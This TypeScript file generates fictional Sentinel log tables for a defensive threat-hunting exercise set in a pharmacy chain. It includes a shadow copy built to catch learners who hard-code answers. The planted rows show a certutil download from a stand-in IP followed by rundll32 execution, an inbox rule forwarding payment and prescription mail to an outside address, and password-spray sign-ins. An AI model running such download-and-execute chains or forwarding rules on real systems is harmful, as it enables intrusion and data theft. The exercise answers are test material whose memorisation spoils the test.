/**
 * Room 36 "Operation Clear Sky" (Ashgrove Pharmacy): the Sentinel workspace the
 * learner queries. Native Log Analytics table and column names (SigninLogs,
 * AuditLogs, OfficeActivity, DeviceProcessEvents); fictional values only.
 *
 * Two copies from one generator: VISIBLE (the evidence) and SHADOW (same tables,
 * same noise, other planted people, hosts and addresses). A query that answers
 * the question by behaviour passes both; one that types in a value read from the
 * screen fails the shadow.
 *
 * Planted stories (visible copy), each with a decoy that a sloppy query catches:
 *  - CA policy update by k.brennan; decoy: a.dube ADDED a policy (not an update).
 *  - New inbox rule on d.okafor (incident 4412); decoy: an admin's Set-InboxRule.
 *  - certutil -urlcache on ASH-SHP-0217; decoys: certutil -hashfile / -verify elsewhere.
 *  - Travel: r.ansah (3 countries, one device, MFA) and d.okafor (GB, ES, PT on her own
 *    laptop with MFA, then NG from the attacker, single factor); decoys: l.moreau (2 extra countries only in FAILED
 *    sign-ins), j.kowalski (extra countries 8 days ago, outside 7d).
 *  - Incident IP 198.51.100.23 (kept in both copies: the incident card names it):
 *    tries 4 accounts, gets into d.okafor.
 *  - Sprays: 203.0.113.77 (fast, 14 accounts, one success) and 198.51.100.140 (slow,
 *    12 accounts in 28 min); decoy: the shop NAT 198.51.100.10 at the 08:00 shift
 *    change, 13 mistypes followed by 13 successes.
 */
import type { MissionDataset, MissionTable } from "../types";

const NOW = "2026-11-09T12:00:00Z";
const NOW_MS = Date.parse(NOW);
const DOMAIN = "ashgrove.example";

function rng(seed: number) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** ISO time `days` days and `hhmm` before NOW's date at that clock time (UTC). */
function at(daysAgo: number, hh: number, mm: number, ss = 0): string {
  const d = new Date(NOW_MS - daysAgo * 86400000);
  d.setUTCHours(hh, mm, ss, 0);
  return d.toISOString().replace(".000Z", "Z");
}

const u = (name: string) => `${name}@${DOMAIN}`;

interface Cast {
  caActor: string;
  caDecoy: string;
  ruleMailbox: string;
  ruleAdmin: string;
  certutilHost: string;
  certutilUser: string;
  traveller: { user: string; device: string; places: [string, string][] };
  /** The incident victim's own trip earlier in the week: MFA, own device. The attacker's Nigerian sign-in makes it four countries. */
  trip: [string, string][];
  failTraveller: string;
  oldTraveller: string;
  incident: { ip: string; victim: string; tried: string[] };
  fastSpray: { ip: string; success: string };
  slowSpray: string;
  seed: number;
}

const STAFF = [
  "a.okonkwo", "b.hartley", "c.obi", "d.okafor", "e.varga", "f.lindqvist", "g.mensah", "h.leclerc", "i.petrov", "j.kowalski",
  "k.brennan", "l.moreau", "m.ferreira", "n.achterberg", "o.salonen", "p.nair", "q.adeyemi", "r.ansah", "s.okeke", "t.lindqvist",
  "u.haddad", "v.costa", "w.tanaka", "x.duarte", "y.akhtar", "z.fournier", "a.dube", "b.iyer", "c.walsh", "d.mbeki",
];

const VISIBLE: Cast = {
  caActor: "k.brennan", caDecoy: "a.dube",
  ruleMailbox: "d.okafor", ruleAdmin: "u.haddad",
  certutilHost: "ASH-SHP-0217", certutilUser: "shop0217",
  traveller: { user: "r.ansah", device: "6f1c2a90-4b7e-4c55-9d1e-0a2b3c4d5e61", places: [["GB", "198.51.100.31"], ["IE", "203.0.113.36"], ["FR", "203.0.113.39"]] },
  trip: [["ES", "203.0.113.83"], ["PT", "203.0.113.87"]],
  failTraveller: "l.moreau", oldTraveller: "j.kowalski",
  incident: { ip: "198.51.100.23", victim: "d.okafor", tried: ["p.nair", "c.obi", "h.leclerc"] },
  fastSpray: { ip: "203.0.113.77", success: "m.ferreira" },
  slowSpray: "198.51.100.140",
  seed: 3601,
};

const SHADOW: Cast = {
  caActor: "s.okeke", caDecoy: "w.tanaka",
  ruleMailbox: "v.costa", ruleAdmin: "b.iyer",
  certutilHost: "ASH-SHP-0088", certutilUser: "shop0088",
  traveller: { user: "o.salonen", device: "0d9e8f7a-6b5c-4d3e-8f2a-1b0c9d8e7f6a", places: [["GB", "198.51.100.44"], ["ES", "203.0.113.52"], ["PT", "203.0.113.57"]] },
  trip: [["IT", "203.0.113.95"], ["GR", "203.0.113.97"]],
  failTraveller: "y.akhtar", oldTraveller: "e.varga",
  incident: { ip: "198.51.100.23", victim: "g.mensah", tried: ["i.petrov", "x.duarte", "z.fournier", "c.walsh"] },
  fastSpray: { ip: "203.0.113.91", success: "n.achterberg" },
  slowSpray: "198.51.100.171",
  seed: 9067,
};

// ─── SigninLogs ───────────────────────────────────────────────────────────────

const SIGNIN_COLUMNS: MissionTable["columns"] = [
  { name: "TimeGenerated", type: "datetime" },
  { name: "UserPrincipalName", type: "string" },
  { name: "AppDisplayName", type: "string" },
  { name: "IPAddress", type: "string" },
  { name: "Location", type: "string" },
  { name: "ResultType", type: "string" },
  { name: "ResultDescription", type: "string" },
  { name: "ClientAppUsed", type: "string" },
  { name: "AuthenticationRequirement", type: "string" },
  { name: "ConditionalAccessStatus", type: "string" },
  { name: "DeviceDetail", type: "dynamic" },
  { name: "RiskLevelDuringSignIn", type: "string" },
  { name: "UserAgent", type: "string" },
  { name: "CorrelationId", type: "string" },
];

const APPS = ["Office 365 Exchange Online", "Microsoft Teams", "Office 365 SharePoint Online", "Ashgrove Dispensing Portal", "Microsoft Office"];
const UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0";
const UA_EAS = "Android-Mail/2024.10.20.0";
const UA_PY = "python-requests/2.32.3";

function guid(r: () => number): string {
  const h = () => Math.floor(r() * 16).toString(16);
  const s = (n: number) => Array.from({ length: n }, h).join("");
  return `${s(8)}-${s(4)}-4${s(3)}-${"89ab"[Math.floor(r() * 4)]}${s(3)}-${s(12)}`;
}

function signins(c: Cast): Record<string, unknown>[] {
  const r = rng(c.seed);
  const rows: Record<string, unknown>[] = [];
  const devices = new Map<string, string>();
  const deviceOf = (who: string) => { if (!devices.has(who)) devices.set(who, guid(r)); return devices.get(who)!; };
  const ok = (time: string, who: string, ip: string, loc: string, o: Partial<Record<string, unknown>> = {}) => rows.push({
    TimeGenerated: time, UserPrincipalName: u(who), AppDisplayName: APPS[Math.floor(r() * APPS.length)], IPAddress: ip, Location: loc,
    ResultType: "0", ResultDescription: "", ClientAppUsed: "Browser", AuthenticationRequirement: "multiFactorAuthentication",
    ConditionalAccessStatus: "success", DeviceDetail: { deviceId: deviceOf(who), operatingSystem: "Windows 11", browser: "Edge 130.0.0", isCompliant: true },
    RiskLevelDuringSignIn: "none", UserAgent: UA_EDGE, CorrelationId: guid(r), ...o,
  });
  const bad = (time: string, who: string, ip: string, loc: string, o: Partial<Record<string, unknown>> = {}) => ok(time, who, ip, loc, {
    ResultType: "50126", ResultDescription: "Error validating credentials due to invalid username or password.",
    AuthenticationRequirement: "singleFactorAuthentication", ConditionalAccessStatus: "notApplied", ...o,
  });

  // Baseline: staff at the shops (behind the NAT) and at home, over 9 days.
  const planted = new Set([c.traveller.user, c.failTraveller, c.oldTraveller]);
  for (const who of STAFF) {
    if (planted.has(who)) continue;
    const n = 3 + Math.floor(r() * 3);
    for (let i = 0; i < n; i++) {
      const day = Math.floor(r() * 9);
      const home = r() < 0.35;
      ok(at(day, 7 + Math.floor(r() * 11), Math.floor(r() * 60), Math.floor(r() * 60)), who, home ? `198.51.100.${50 + Math.floor(r() * 30)}` : "198.51.100.10", "GB");
    }
  }

  // Travel: one person, one device, MFA every time.
  c.traveller.places.forEach(([loc, ip], i) => {
    ok(at(5 - i * 2, 9 + i, 14 + i * 7, 11), c.traveller.user, ip, loc, { DeviceDetail: { deviceId: c.traveller.device, operatingSystem: "Windows 11", browser: "Edge 130.0.0", isCompliant: true } });
    ok(at(5 - i * 2, 15, 2 + i * 3, 40), c.traveller.user, ip, loc, { DeviceDetail: { deviceId: c.traveller.device, operatingSystem: "Windows 11", browser: "Edge 130.0.0", isCompliant: true } });
  });
  // The incident victim's real trip (Spain, then Portugal): own laptop, MFA. Home at the shop before and after.
  ok(at(6, 8, 52, 14), c.incident.victim, "198.51.100.10", "GB");
  c.trip.forEach(([loc, ip], i) => {
    ok(at(4 - i, 10 + i, 31, 7), c.incident.victim, ip, loc);
    ok(at(4 - i, 18, 12 + i * 9, 45), c.incident.victim, ip, loc);
  });
  // Decoy: extra countries only in failed sign-ins.
  ok(at(3, 8, 41, 9), c.failTraveller, "198.51.100.10", "GB");
  ok(at(1, 8, 37, 50), c.failTraveller, "198.51.100.10", "GB");
  bad(at(2, 23, 12, 4), c.failTraveller, "203.0.113.150", "DE", { UserAgent: UA_PY });
  bad(at(2, 23, 19, 31), c.failTraveller, "203.0.113.162", "ES", { UserAgent: UA_PY });
  // Decoy: extra countries outside the 7-day window.
  ok(at(8, 13, 2, 19), c.oldTraveller, "203.0.113.120", "US");
  ok(at(8, 21, 48, 5), c.oldTraveller, "203.0.113.124", "CA");
  ok(at(2, 9, 3, 33), c.oldTraveller, "198.51.100.10", "GB");
  ok(at(0, 9, 11, 2), c.oldTraveller, "198.51.100.62", "GB");

  // Incident IP: tries several accounts, gets into one with a single factor at 23:41, straight into Exchange.
  c.incident.tried.forEach((who, i) => bad(at(1, 23, 35 + i, 10 + i * 7), who, c.incident.ip, "NG", { AppDisplayName: "Office 365 Exchange Online", UserAgent: UA_PY, RiskLevelDuringSignIn: "medium" }));
  bad(at(1, 23, 40, 2), c.incident.victim, c.incident.ip, "NG", { AppDisplayName: "Office 365 Exchange Online", UserAgent: UA_PY, RiskLevelDuringSignIn: "medium" });
  ok(at(1, 23, 41, 7), c.incident.victim, c.incident.ip, "NG", {
    AppDisplayName: "Office 365 Exchange Online", AuthenticationRequirement: "singleFactorAuthentication", ConditionalAccessStatus: "notApplied",
    DeviceDetail: { deviceId: "", operatingSystem: "Linux", browser: "Python Requests 2.32", isCompliant: false }, UserAgent: UA_PY, RiskLevelDuringSignIn: "medium",
  });

  // 08:00 shift change at the shops: mistypes, then the same people get in.
  const rush = STAFF.filter(s => !planted.has(s)).slice(4, 17);
  rush.forEach((who, i) => {
    bad(at(0, 8, i % 9, 12 + i), who, "198.51.100.10", "GB", { UserAgent: UA_EDGE, ClientAppUsed: "Browser" });
    ok(at(0, 8, (i % 9) + 1, 40 + (i % 19)), who, "198.51.100.10", "GB");
  });

  // Fast spray over Exchange ActiveSync (legacy protocol: no MFA, no CA): one success.
  const sprayed = STAFF.filter(s => s !== c.fastSpray.success).slice(0, 13);
  sprayed.forEach((who, i) => bad(at(2, 3, 10 + i, 5 + i * 3), who, c.fastSpray.ip, "RU", { ClientAppUsed: "Exchange ActiveSync", UserAgent: UA_EAS, AppDisplayName: "Office 365 Exchange Online", DeviceDetail: { deviceId: "", operatingSystem: "Android", browser: "", isCompliant: false } }));
  ok(at(2, 3, 24, 51), c.fastSpray.success, c.fastSpray.ip, "RU", {
    ClientAppUsed: "Exchange ActiveSync", UserAgent: UA_EAS, AppDisplayName: "Office 365 Exchange Online", AuthenticationRequirement: "singleFactorAuthentication",
    ConditionalAccessStatus: "notApplied", DeviceDetail: { deviceId: "", operatingSystem: "Android", browser: "", isCompliant: false },
  });
  // Slow spray: 12 accounts in 28 minutes, all inside one half-hour.
  STAFF.slice(14, 26).forEach((who, i) => bad(at(4, 2, 1 + Math.floor(i * 2.4), 30 + i), who, c.slowSpray, "VN", { ClientAppUsed: "Authenticated SMTP", UserAgent: "", AppDisplayName: "Office 365 Exchange Online", DeviceDetail: { deviceId: "", operatingSystem: "", browser: "", isCompliant: false } }));

  return rows.sort((a, b) => String(a.TimeGenerated).localeCompare(String(b.TimeGenerated)));
}

// ─── AuditLogs ────────────────────────────────────────────────────────────────

function auditLogs(c: Cast): Record<string, unknown>[] {
  const r = rng(c.seed + 1);
  const by = (who: string, ip: string) => ({ user: { userPrincipalName: u(who), ipAddress: ip, id: guid(r) } });
  const row = (time: string, op: string, cat: string, who: string, target: string, type: string) => ({
    TimeGenerated: time, OperationName: op, Category: cat, Result: "success", ResultReason: "",
    InitiatedBy: by(who, "198.51.100.12"), TargetResources: [{ displayName: target, type, id: guid(r) }], LoggedByService: cat === "Policy" ? "Conditional Access" : "Core Directory",
    CorrelationId: guid(r),
  });
  const out = [
    row(at(6, 10, 4), "Update user", "UserManagement", "u.haddad", u("q.adeyemi"), "User"),
    row(at(6, 10, 9), "Add member to group", "GroupManagement", "u.haddad", "Shop Managers North", "Group"),
    row(at(5, 14, 31), "Reset user password", "UserManagement", "b.hartley", u("t.lindqvist"), "User"),
    row(at(4, 9, 12), "Add conditional access policy", "Policy", c.caDecoy, "Block legacy authentication (pilot)", "Policy"),
    row(at(4, 16, 45), "Update application", "ApplicationManagement", "a.okonkwo", "Ashgrove Dispensing Portal", "Application"),
    row(at(3, 11, 20), "Add member to group", "GroupManagement", "b.hartley", "Pharmacists Relief Pool", "Group"),
    row(at(2, 15, 7), "Consent to application", "ApplicationManagement", "f.lindqvist", "Rota Planner", "ServicePrincipal"),
    row(at(1, 17, 52), "Update conditional access policy", "Policy", c.caActor, "Require MFA for all users", "Policy"),
    row(at(1, 18, 3), "Update user", "UserManagement", "u.haddad", u("w.tanaka"), "User"),
    row(at(0, 9, 40), "Add user", "UserManagement", "b.hartley", u("locum.pharm07"), "User"),
    row(at(0, 10, 5), "Update group", "GroupManagement", "u.haddad", "Dispensary Staff", "Group"),
  ];
  return out.sort((a, b) => String(a.TimeGenerated).localeCompare(String(b.TimeGenerated)));
}

// ─── OfficeActivity ───────────────────────────────────────────────────────────

function officeActivity(c: Cast): Record<string, unknown>[] {
  const r = rng(c.seed + 2);
  const row = (time: string, op: string, who: string, ip: string, recordType: string, workload: string, params = "") => ({
    TimeGenerated: time, Operation: op, UserId: u(who), ClientIP: ip, RecordType: recordType, OfficeWorkload: workload,
    ResultStatus: "Succeeded", Parameters: params, OfficeObjectId: workload === "SharePoint" ? `https://ashgrove.sharepoint.example/sites/Dispensing/${Math.floor(r() * 900 + 100)}.xlsx` : "",
  });
  const out: Record<string, unknown>[] = [];
  for (let i = 0; i < 16; i++) {
    const who = STAFF[Math.floor(r() * STAFF.length)];
    const kind = r();
    const time = at(Math.floor(r() * 9), 8 + Math.floor(r() * 10), Math.floor(r() * 60));
    if (kind < 0.4) out.push(row(time, "MailItemsAccessed", who, "198.51.100.10", "ExchangeItem", "Exchange"));
    else if (kind < 0.7) out.push(row(time, "FileDownloaded", who, "198.51.100.10", "SharePointFileOperation", "SharePoint"));
    else out.push(row(time, "Send", who, "198.51.100.10", "ExchangeItem", "Exchange"));
  }
  out.push(row(at(3, 13, 2), "Set-InboxRule", c.ruleAdmin, "198.51.100.12", "ExchangeAdmin", "Exchange",
    JSON.stringify([{ Name: "Identity", Value: "Shared Rota\\Move rota emails" }, { Name: "MoveToFolder", Value: "Rota" }])));
  out.push(row(at(2, 11, 26), "Set-Mailbox", c.ruleAdmin, "198.51.100.12", "ExchangeAdmin", "Exchange",
    JSON.stringify([{ Name: "Identity", Value: "Shared Rota" }, { Name: "AuditEnabled", Value: "True" }])));
  out.push(row(at(1, 23, 44), "New-InboxRule", c.ruleMailbox, `${c.incident.ip}:51234`, "ExchangeAdmin", "Exchange",
    JSON.stringify([{ Name: "Name", Value: "." }, { Name: "SubjectOrBodyContainsWords", Value: "invoice;payment;prescription" }, { Name: "ForwardTo", Value: "rx.archive@mailbox-relay.example" }, { Name: "MarkAsRead", Value: "True" }, { Name: "MoveToFolder", Value: "RSS Subscriptions" }, { Name: "StopProcessingRules", Value: "True" }])));
  out.push(row(at(1, 23, 45), "MailItemsAccessed", c.ruleMailbox, `${c.incident.ip}:51240`, "ExchangeItem", "Exchange"));
  for (let i = 0; i < 9; i++) out.push(row(at(1, 23, 47 + i, 5 + i * 4), "FileDownloaded", c.ruleMailbox, c.incident.ip, "SharePointFileOperation", "SharePoint"));
  return out.sort((a, b) => String(a.TimeGenerated).localeCompare(String(b.TimeGenerated)));
}

// ─── DeviceProcessEvents ──────────────────────────────────────────────────────

function processEvents(c: Cast): Record<string, unknown>[] {
  const r = rng(c.seed + 3);
  let report = 9000 + Math.floor(r() * 500);
  const row = (time: string, host: string, acct: string, file: string, folder: string, cmd: string, parent: string) => ({
    TimeGenerated: time, DeviceName: host, AccountName: acct, FileName: file, FolderPath: `${folder}\\${file}`,
    ProcessCommandLine: cmd, InitiatingProcessFileName: parent, ReportId: report++,
  });
  const shops = ["ASH-SHP-0031", "ASH-SHP-0088", "ASH-SHP-0111", "ASH-SHP-0217", "ASH-SHP-0254", "ASH-SHP-0302"].filter(h => h !== c.certutilHost);
  const out: Record<string, unknown>[] = [];
  const normal: [string, string, string, string][] = [
    ["msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application", "\"msedge.exe\" --profile-directory=Default", "explorer.exe"],
    ["DispenseClient.exe", "C:\\Program Files\\Ashgrove\\Dispense", "\"DispenseClient.exe\" /store auto", "explorer.exe"],
    ["ms-teams.exe", "C:\\Program Files\\WindowsApps\\MSTeams_24295.605.3225.8804_x64__8wekyb3d8bbwe", "\"ms-teams.exe\" --system-initiated", "explorer.exe"],
    ["OneDrive.exe", "C:\\Program Files\\Microsoft OneDrive", "\"OneDrive.exe\" /background", "explorer.exe"],
    ["svchost.exe", "C:\\Windows\\System32", "svchost.exe -k netsvcs -p -s Schedule", "services.exe"],
  ];
  for (let i = 0; i < 30; i++) {
    const host = shops[Math.floor(r() * shops.length)];
    const [file, folder, cmd, parent] = normal[Math.floor(r() * normal.length)];
    out.push(row(at(Math.floor(r() * 9), 7 + Math.floor(r() * 12), Math.floor(r() * 60)), host, host.replace("ASH-SHP-", "shop").toLowerCase(), file, folder, cmd, parent));
  }
  out.push(row(at(5, 10, 22), "ASH-ADM-01", "u.haddad", "certutil.exe", "C:\\Windows\\System32", "certutil.exe -hashfile C:\\Installers\\DispenseClient-5.2.msi SHA256", "powershell.exe"));
  out.push(row(at(3, 15, 40), shops[1], shops[1].replace("ASH-SHP-", "shop").toLowerCase(), "certutil.exe", "C:\\Windows\\System32", "certutil.exe -verify C:\\ProgramData\\Ashgrove\\certs\\printer-root.cer", "cmd.exe"));
  out.push(row(at(1, 22, 31), c.certutilHost, c.certutilUser, "cmd.exe", "C:\\Windows\\System32", "cmd.exe /c certutil.exe -urlcache -split -f http://203.0.113.66/rota.png C:\\Users\\Public\\rota.png", "wscript.exe"));
  out.push(row(at(1, 22, 31), c.certutilHost, c.certutilUser, "certutil.exe", "C:\\Windows\\System32", "certutil.exe  -urlcache -split -f http://203.0.113.66/rota.png C:\\Users\\Public\\rota.png", "cmd.exe"));
  out.push(row(at(1, 22, 33), c.certutilHost, c.certutilUser, "rundll32.exe", "C:\\Windows\\System32", "rundll32.exe C:\\Users\\Public\\rota.png,Start", "cmd.exe"));
  return out.sort((a, b) => String(a.TimeGenerated).localeCompare(String(b.TimeGenerated)));
}

function build(c: Cast): MissionDataset {
  return {
    now: NOW,
    tables: [
      { name: "SigninLogs", columns: SIGNIN_COLUMNS, rows: signins(c) },
      {
        name: "AuditLogs",
        columns: [
          { name: "TimeGenerated", type: "datetime" }, { name: "OperationName", type: "string" }, { name: "Category", type: "string" },
          { name: "Result", type: "string" }, { name: "ResultReason", type: "string" }, { name: "InitiatedBy", type: "dynamic" },
          { name: "TargetResources", type: "dynamic" }, { name: "LoggedByService", type: "string" }, { name: "CorrelationId", type: "string" },
        ],
        rows: auditLogs(c),
      },
      {
        name: "OfficeActivity",
        columns: [
          { name: "TimeGenerated", type: "datetime" }, { name: "Operation", type: "string" }, { name: "UserId", type: "string" },
          { name: "ClientIP", type: "string" }, { name: "RecordType", type: "string" }, { name: "OfficeWorkload", type: "string" },
          { name: "ResultStatus", type: "string" }, { name: "Parameters", type: "string" }, { name: "OfficeObjectId", type: "string" },
        ],
        rows: officeActivity(c),
      },
      {
        name: "DeviceProcessEvents",
        columns: [
          { name: "TimeGenerated", type: "datetime" }, { name: "DeviceName", type: "string" }, { name: "AccountName", type: "string" },
          { name: "FileName", type: "string" }, { name: "FolderPath", type: "string" }, { name: "ProcessCommandLine", type: "string" },
          { name: "InitiatingProcessFileName", type: "string" }, { name: "ReportId", type: "long" },
        ],
        rows: processEvents(c),
      },
    ],
  };
}

export const CLEAR_SKY = { visible: () => build(VISIBLE), shadow: () => build(SHADOW) };

/** The planted values the room's missions refer to in prose (incident card, raw row). Visible copy only. */
export const CLEAR_SKY_FACTS = {
  incidentIp: VISIBLE.incident.ip,
  incidentVictim: u(VISIBLE.incident.victim),
  incidentTried: VISIBLE.incident.tried.length + 1,
  traveller: u(VISIBLE.traveller.user),

  fastSpray: VISIBLE.fastSpray,
  slowSpray: VISIBLE.slowSpray,
  caActor: u(VISIBLE.caActor),
  ruleMailbox: u(VISIBLE.ruleMailbox),
  certutilHost: VISIBLE.certutilHost,
  sprayedAccounts: 13,
  at,
  u,
};
